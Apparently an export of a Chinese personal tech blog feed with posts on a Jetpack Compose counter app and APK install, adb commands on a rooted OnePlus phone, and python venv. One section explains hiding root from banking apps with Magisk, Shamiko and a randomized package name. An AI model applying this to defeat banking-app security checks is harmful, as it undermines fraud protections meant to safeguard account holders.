class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle  </span><br><span class="line"><span class="keyword">import</span> androidx.activity.ComponentActivity  </span><br><span class="line"><span class="keyword">import</span> androidx.activity.compose.setContent  </span><br><span class="line"><span class="keyword">import</span> androidx.activity.enableEdgeToEdge  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.fillMaxSize  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.padding  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Scaffold  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Text  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.Composable  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Modifier  </span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.tooling.preview.Preview  </span><br><span class="line"><span class="keyword">import</span> com.example.demo.ui.theme.DemoTheme  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : <span class="type">ComponentActivity</span>() &#123;  </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;  </span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)  </span><br><span class="line">        enableEdgeToEdge()  </span><br><span class="line">        setContent &#123;  </span><br><span class="line">            DemoTheme &#123;  </span><br><span class="line">                Scaffold(modifier = Modifier.fillMaxSize()) &#123; innerPadding -&gt;  </span><br><span class="line">                    Greeting(  </span><br><span class="line">                        name = <span class="string">&quot;Android&quot;</span>,  </span><br><span class="line">                        modifier = Modifier.padding(innerPadding)  </span><br><span class="line">                    )  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;        &#125;    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Composable</span>  </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">Greeting</span><span class="params">(name: <span class="type">String</span>, modifier: <span class="type">Modifier</span> = Modifier)</span></span> &#123;  </span><br><span class="line">    Text(  </span><br><span class="line">        text = <span class="string">&quot;Hello <span class="variable">$name</span>!&quot;</span>,  </span><br><span class="line">        modifier = modifier  </span><br><span class="line">    )  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Preview(showBackground = true)</span>  </span><br><span class="line"><span class="meta">@Composable</span>  </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">GreetingPreview</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    DemoTheme &#123;  </span><br><span class="line">        Greeting(<span class="string">&quot;Android&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MainActivity.kt</code>是Android应用的主要活动文件，负责定义应用的行为和用户界面。在这个文件中，使用了Jetpack Compose，这是Android的现代UI工具包，允许开发者使用Kotlin代码构建用户界面，而不是传统的XML布局。</p><p>在<code>MainActivity</code>类中，<code>onCreate</code>方法是活动的入口点，主要作用是设置活动的内容。在这里，调用了<code>setContent</code>方法来定义用户界面。通过<code>DemoTheme</code>，应用了主题样式。<code>Scaffold</code>是一个布局组件，提供了基本的应用结构，如顶部应用栏、底部导航等。<code>innerPadding</code>用于处理内容的内边距，以避免与系统UI重叠。</p><p>像上个小标题中我列出的文本试图+按钮的代码，可以使用如下kotlin实现：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle</span><br><span class="line"><span class="keyword">import</span> androidx.activity.ComponentActivity</span><br><span class="line"><span class="keyword">import</span> androidx.activity.compose.setContent</span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.*</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Button</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Text</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.Composable</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Alignment</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Modifier</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.unit.dp</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.unit.sp</span><br><span class="line"><span class="keyword">import</span> com.example.demo.ui.theme.DemoTheme</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : <span class="type">ComponentActivity</span>() &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContent &#123;</span><br><span class="line">            DemoTheme &#123;</span><br><span class="line">                MainScreen()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">MainScreen</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用Column代替LinearLayout，设置垂直排列</span></span><br><span class="line">    Column(</span><br><span class="line">        modifier = Modifier</span><br><span class="line">            .fillMaxSize()</span><br><span class="line">            .padding(<span class="number">16.</span>dp),</span><br><span class="line">        horizontalAlignment = Alignment.CenterHorizontally,</span><br><span class="line">        verticalArrangement = Arrangement.Center</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="comment">// TextView</span></span><br><span class="line">        Text(</span><br><span class="line">            text = <span class="string">&quot;Hello, World!&quot;</span>,</span><br><span class="line">            fontSize = <span class="number">24.</span>sp</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Button</span></span><br><span class="line">        Button(onClick = &#123; <span class="comment">/* <span class="doctag">TODO:</span> Handle button click */</span> &#125;) &#123;</span><br><span class="line">            Text(text = <span class="string">&quot;Click Me&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来也差不多。但现在好像都更推荐使用Jetpack Compose。</p><p>主要原因是Hetpack Compose支持响应式编程，能够自动根据数据变化更新界面，简化了手动更新UI的过程。这种方式提高了开发效率，特别是在处理动态内容时，开发者可以更专注于业务逻辑而不是视图的状态管理。此外，Compose的可组合性使得开发者能够创建可重用的组件，增强了代码的可维护性和可读性。通过组合不同的UI元素，开发者可以快速构建复杂的界面，同时保持代码的清晰和结构化。</p><p>虽然我的java依托，但搜搜语法也能直接上手试试。我编写了一个入门常见案例：点击后+1的按钮。常用前端框架都喜欢把这个小组件用在初始项目中。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle</span><br><span class="line"><span class="keyword">import</span> androidx.activity.ComponentActivity</span><br><span class="line"><span class="keyword">import</span> androidx.activity.compose.setContent</span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.*</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Button</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Text</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.*</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Alignment</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Modifier</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.unit.dp</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.unit.sp</span><br><span class="line"><span class="keyword">import</span> com.example.demo.ui.theme.DemoTheme</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : <span class="type">ComponentActivity</span>() &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContent &#123;</span><br><span class="line">            DemoTheme &#123;</span><br><span class="line">                MainScreen()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">MainScreen</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> count <span class="keyword">by</span> remember &#123; mutableStateOf(<span class="number">0</span>) &#125;</span><br><span class="line"></span><br><span class="line">    Column(</span><br><span class="line">        modifier = Modifier</span><br><span class="line">            .fillMaxSize()</span><br><span class="line">            .padding(<span class="number">16.</span>dp),</span><br><span class="line">        horizontalAlignment = Alignment.CenterHorizontally,</span><br><span class="line">        verticalArrangement = Arrangement.Center</span><br><span class="line">    ) &#123;</span><br><span class="line">        Text(</span><br><span class="line">            text = count.toString(),</span><br><span class="line">            fontSize = <span class="number">48.</span>sp</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        Spacer(modifier = Modifier.height(<span class="number">16.</span>dp))</span><br><span class="line"></span><br><span class="line">        Button(onClick = &#123; count++ &#125;) &#123;</span><br><span class="line">            Text(text = <span class="string">&quot;Click Me&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Spacer(modifier = Modifier.weight(<span class="number">1f</span>))</span><br><span class="line"></span><br><span class="line">        Text(</span><br><span class="line">            text = <span class="string">&quot;Hello Kinoko&quot;</span>,</span><br><span class="line">            modifier = Modifier.align(Alignment.CenterHorizontally)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.ma5hr00m.top/2025/20250109194746.png" alt="image.png"></p><h3 id="打包为apk并安装在真实设备"><a href="#打包为apk并安装在真实设备" class="headerlink" title="打包为apk并安装在真实设备"></a>打包为apk并安装在真实设备</h3><p>有两种方式，命令行打包和IDE打包，先尝试后者。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install gradle</span><br></pre></td></tr></table></figure><p>Android Studio菜单栏Build-Build App Bundle(s)&#x2F;APK(s)-Build APK(s)，稍等片刻就会自动打包，打包可以获得debug版本的apk安装包，路径为<code>app/build/outputs/apk/debug/app-debug.apk</code>，usb数据线连接手机后使用adb安装即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb -s xxx install C:\Users\xxx\AndroidStudioProjects\Demo\app\build\outputs\apk\debug\app-debug.apk</span><br></pre></td></tr></table></figure><blockquote><p>我这里因为同时连接了显示器和手机，所以用<code>-s</code>指定设备</p></blockquote><p>经检验，debug版本的app在手机上也可以正常安装使用。</p><p><img src="https://img.ma5hr00m.top/2025/img_v3_02ic_2b2adb11-5e56-45c2-8343-f30b9e43cccg.jpg" alt="img_v3_02ic_2b2adb11-5e56-45c2-8343-f30b9e43cccg.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Android Studio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷机root-OnePlus</title>
      <link href="/2025/01/07/2025/oneplus/"/>
      <url>/2025/01/07/2025/oneplus/</url>
      
        <content type="html"><![CDATA[<p>手上有台备用的oneplus ace2，这两天正好利用起来，看看有没有好玩的东西。</p><p>前段时间按照教程刷了root，虽然中间险些变砖，但总体不难，按照教程走就行。刷机root的过程在此略过，注意下不要变砖就行，自己不会操作的话，网上也有很多现成的一键root工具（感谢先人的馈赠），稍微研究下即可。</p><h2 id="ADB工具"><a href="#ADB工具" class="headerlink" title="ADB工具"></a>ADB工具</h2><p>ADB（Android Debug Bridge）是一个用于与Android设备进行交互的命令行工具。它允许开发者和用户通过计算机与Android设备进行通信，执行各种操作，如安装和卸载应用程序、调试应用、访问设备的文件系统、执行命令等。</p><p>windows下的包管理工具也算比较成熟了，直接用winget安装即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget install Google.PlatformTools</span><br></pre></td></tr></table></figure><p>然后使用adb命令时会抛出报错：</p><p><img src="https://img.ma5hr00m.top/blog2410/20241022114332.png" alt="image.png"></p><blockquote><p><a href="https://blog.csdn.net/w_s_x_b/article/details/91793734">由于找不到adbwinapi.dll,无法继续执行代码。重新安装程序可能会解决此问题-CSDN博客</a></p></blockquote><p>相关文件路径，需要管理员权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AdbWinApi.ddl和adb.exe的位置</span></span><br><span class="line">C:\Users\xxx\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb.exe移动到</span></span><br><span class="line">C:\Windows\System32</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AdbWinApi.ddl移动到</span></span><br><span class="line">C:/Windows/SysWOW64</span><br></pre></td></tr></table></figure><p>复制完文件后关闭并重新打开cmd命令行，可正常使用adb工具：</p><p><img src="https://img.ma5hr00m.top/blog2410/20241022114730.png" alt="image.png"></p><p>在这里贴了常用命令，基本够用，有更进一步的需求再搜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看已连接设备</span></span><br><span class="line">adb devices</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 APK 文件</span></span><br><span class="line">adb install path/to/your/app.apk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载应用</span></span><br><span class="line">adb uninstall package.name.of.your.app</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制文件到设备</span></span><br><span class="line">adb push local/file/path /sdcard/remote/file/path</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从设备复制文件到本地</span></span><br><span class="line">adb pull /sdcard/remote/file/path local/file/path</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看设备日志</span></span><br><span class="line">adb logcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启设备</span></span><br><span class="line">adb reboot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入设备的 shell</span></span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取设备的屏幕截图</span></span><br><span class="line">adb exec-out screencap -p &gt; screenshot.png</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">录制设备屏幕</span></span><br><span class="line">adb shell screenrecord /sdcard/video.mp4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除应用数据</span></span><br><span class="line">adb shell pm clear package.name.of.your.app</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看设备的系统信息</span></span><br><span class="line">adb shell getprop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入特定的应用程序</span></span><br><span class="line">adb shell am start -n package.name.of.your.app/.MainActivity</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止特定的应用程序</span></span><br><span class="line">adb shell am force-stop package.name.of.your.app</span><br></pre></td></tr></table></figure><h2 id="oneplus投屏到windows10"><a href="#oneplus投屏到windows10" class="headerlink" title="oneplus投屏到windows10"></a>oneplus投屏到windows10</h2><p>windows10打开设置-系统-投影到此电脑，初次使用会要求添加功能，下载对应模块即可</p><p><img src="https://img.ma5hr00m.top/2025/20250107110827.png" alt="image.png"></p><p>自动安装对应模块，再将投影到此电脑设置为“所有位置可用”。</p><p>然后手机设置-蓝牙和设备连接-连接与偏好设置-投射屏幕-右上角三个点无线显示打钩-连接电脑，无线显示要现在开发者选项中打开。随后电脑和手机同时开启投屏功能，配对后即可连接，不过实际测试无线连接的延迟比较大。</p><p><img src="https://img.ma5hr00m.top/2025/20250107111325.png" alt="image.png"></p><h2 id="usb调试-MIDI"><a href="#usb调试-MIDI" class="headerlink" title="usb调试-MIDI"></a>usb调试-MIDI</h2><p>使用usb数据线将手机与电脑链接时，总是能看到MIDI的连接方式，那这到底是什么呢。</p><p><a href="https://www.midifan.com/modulenews-detailview-35773.htm">MIDI 到底是个什么鬼？希望所有人都知道 MIDI 给世界带来了什么改变 - midifan：我们关注电脑音乐</a></p><p>这里有个类比。要用电脑打印一封信，你可以在它的QWERTY键盘上键入。这将使用一种称为ASCII（美国信息交换标准代码）的计算机语言，向您的计算机发送与您键入的字母相对应的数据。</p><p>这个标准化的代码集表示字母、数字和符号。因为计算机讲的是ASCII，文字处理器可以在屏幕上显示这些字母。因为你的打印机使用ASCII码，所以计算机可以将数据从文字处理器发送到打印机，打印机将打印出你的信件。</p><p>MIDI也是一种语言-一组标准化代码，表示音乐参数，如音高、动态、节奏等。它的工作原理与上面给出的ASCII示例类似：在MIDI兼容的键盘上播放音符，该键盘将数据发送到与所播放内容相对应的计算机。录音或记谱程序可以识别这些音符并将其显示在屏幕上。</p><p>然后，您可以将计算机中的MIDI数据发送到与MIDI兼容的音频发生器（可以将其视为音乐打印机），它可以复制您最初在键盘上播放的内容。您也可以通过将键盘直接连接到与MIDI兼容的音频发生器来实时使用MIDI。</p><p>MIDI全称是Musical Instrument Digital Interface，翻译成中文就是：乐器数字接口。是20世纪80年代初为解决电声乐器之间的通信问题而提出的。MIDI是编曲界最广泛的音乐标准格式，可称为“计算机能理解的乐谱”。<br>它用音符的数字控制信号来记录音乐。一首完整的MIDI音乐只有几十KB大，而能包含数十条音乐轨道。几乎所有的现代音乐都是用MIDI加上音色库来制作合成的。MIDI 传输的不是声音信号， 而是音符、控制参数等指令, 它指示MIDI 设备要做什么，怎么做， 如演奏哪个音符、多大音量等。它们被统一表示成MIDI 消息(MIDI Message) 。传输时采用异步串行通信, 标准通信波特率为31.25×( 1±0.01) KBaud。</p><blockquote><p>重要的是要记住MIDI不是音频，而是数据。</p></blockquote><p>到这里就差不多了，大概知道这是个电子音乐垂类的功能就可以了，一般用不上。</p><h2 id="推送图片到相册查找不到"><a href="#推送图片到相册查找不到" class="headerlink" title="推送图片到相册查找不到"></a>推送图片到相册查找不到</h2><p>推送图片到相册实现起来很简单，上面有说过相关指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push .\mobile.jpg /sdcard/DCIM/Camera/</span><br></pre></td></tr></table></figure><p>这时你会发现相册中并没有推送的图片，诶，这是为什么呢？Android系统通常会自动扫描新添加的媒体文件，但有时可能需要一些时间，或者可能是因为相册缓存数据导致新文件不显示。所以我们需要手动触发扫描，可以扫描整个媒体库，也可以单独扫描新推送的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///sdcard/DCIM/Camera/</span><br></pre></td></tr></table></figure><p>然后就能在相册中找到我们推送到图像视频文件了。</p><h2 id="bank-app-hide-root"><a href="#bank-app-hide-root" class="headerlink" title="bank app hide root"></a>bank app hide root</h2><p>我们初步root完设备之后，打开银行软件，会提示当前设备存在风险然后强制退出，这明显干扰设备的日常使用，得解决这个问题。</p><p>我是跟着这个教程走了一遍：<a href="https://zhuanlan.zhihu.com/p/506203078">新版Magisk(面具)隐藏root方法</a>。最后实现的效果就是关闭usb调试的条件下，可以正常使用三大银行app——工商银行、农业银行和招商银行。</p><p>先开启Zygisk(Beta)模块，然后重启手机。</p><p>重启后下载<a href="https://github.com/LSPosed/LSPosed.github.io/releases/tag/shamiko-357">Release Shamiko v1.1.1 · LSPosed&#x2F;LSPosed.github.io · GitHub</a>，主机端下载的话就推送到移动设备</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push .\Shamiko-v1.2.1-383-release.zip /sdcard/</span><br></pre></td></tr></table></figure><p>然后在magisk中找到shamiko以模块形式安装，安装好之后再重启手机。</p><p>重启手机，打开面具右上角设置，打开遵循排除列表选项，再点击配置排除列表，然后勾选你要隐藏root的应用。注意，此处你要点开每个应用的下拉列表手动选中每个配置，只勾选复选框只会选中部分配置项。然后退出排除列表页面再关闭排除列表选项，再重启。</p><p><img src="https://img.ma5hr00m.top/2025/20250107165934.png" alt="image.png"></p><p>重启完成后，原先会检测到你root环境的大部分应用应该都可以使用了，但我的工商银行app依然检测出了不安全的环境。</p><p>此时我们要随机包名Magisk达到隐藏Magisk的效果，以防止被某些软件检测到。</p><p><img src="https://img.ma5hr00m.top/2025/20250107170119.png" alt="image.png"></p><p>操作完成后再重启设备。重启后再次打开工商银行app，会提示检测到有usb调试有不安全的流量，这时我们把usb调试功能关闭，就可以正常使用工商银行app了。</p><blockquote><p>如果还不行的话可以试着安装<a href="https://yun.daxiaamu.com/files/Xposed%E6%A8%A1%E5%9D%97/bankrx/#google_vignette">Xposed模块&#x2F;bankrx - 一加手机官方ROM - 一加手机官方ROM下载</a>工具，也是下载安装包直接<code>adb install</code>即可。</p></blockquote><h2 id="有趣的模块"><a href="#有趣的模块" class="headerlink" title="有趣的模块"></a>有趣的模块</h2><p>参考这篇博客：<a href="https://ivonblog.com/posts/magisk-recommended-modules/">2023年Magisk推薦安裝的模組，提升手機效能、擋廣告、自定義主題 · Ivon的部落格</a></p><h3 id="KTweak"><a href="#KTweak" class="headerlink" title="KTweak"></a>KTweak</h3><ul><li>下載網址：<a href="https://github.com/tytydraco/KTweak-Android-App">GitHub - tytydraco&#x2F;KTweak-Android-App: The Android App for KTweak.</a></li></ul><p>提升Android反应速度，不限机型皆可使用。</p><p>作者宣称程序代码比其他性能提升模块（NFS injector、LKT、MAGNETAR）要公开透明，基于事实证据对系统进行调校。这里提供的链接是前端APP，每次开机后自动启用指令脚本，就不需要装Magisk模块了。提供balance与latency模式，后者以反应速度优先。</p><h3 id="Viper4Android"><a href="#Viper4Android" class="headerlink" title="Viper4Android"></a>Viper4Android</h3><ul><li>下载网址：<a href="https://github.com/programminghoch10/ViPER4AndroidRepackaged">GitHub - programminghoch10&#x2F;ViPER4AndroidRepackaged: A refined ViPER4Android installer.</a></li></ul><p>中国的蝰蛇音效，提升手机扬声器与耳机音乐表现的音效模块。历史悠久的闭源音效软件，提升音效效果最好。此处链接为打包好的Magisk模块，装完就可以用。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-venv如何实现切换虚拟环境</title>
      <link href="/2024/11/20/2024/python-venv/"/>
      <url>/2024/11/20/2024/python-venv/</url>
      
        <content type="html"><![CDATA[<p>之前写过如何管理python环境的文章，比较浅显，这次打算稍微深入一点，探究下我们最常用的python虚拟环境是如何实现的，也就是我们熟悉的那句指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br></pre></td></tr></table></figure><p>执行后会在当前目录创建venv目录，执行这个目录下的activate脚本就会将当前终端切换到虚拟python环境中，那这是如何实现的呢？</p><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>为什么我们需要python虚拟环境呢，直接使用本地环境不可以吗？多数情况下没问题，但时间长了总会遇到特殊情况，这里列举<a href="https://jarvisma.gitbook.io/pythonlearn/5.5-venv/chapter5.5.1">5.5.1 什么是 venv | Python 简单入门指北</a>文章中的案例：</p><blockquote><p>假设我们开发程序A是用到了<code>pip install module1==1.0</code>，也就是安装了<code>module1</code>这个第三方库的1.0版本，同时开发程序B用到了这个第三方库的2.0版本，但是在<code>/usr/local/lib/python3.5/site-packages</code>这个目录下只能留一份，那么 A 和 B 就无法分别使用两个版本的第三方库了。</p></blockquote><p>除此之外，多数开发者希望保持本地环境的简洁有序，而使用python的过程中难免下载各种各样版本不一致的第三方库，这些库之间可能会产生一些奇妙的冲突，比如jwt和pyjwt。当然更多的还是本地的不同项目要求使用同一个库的不同版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 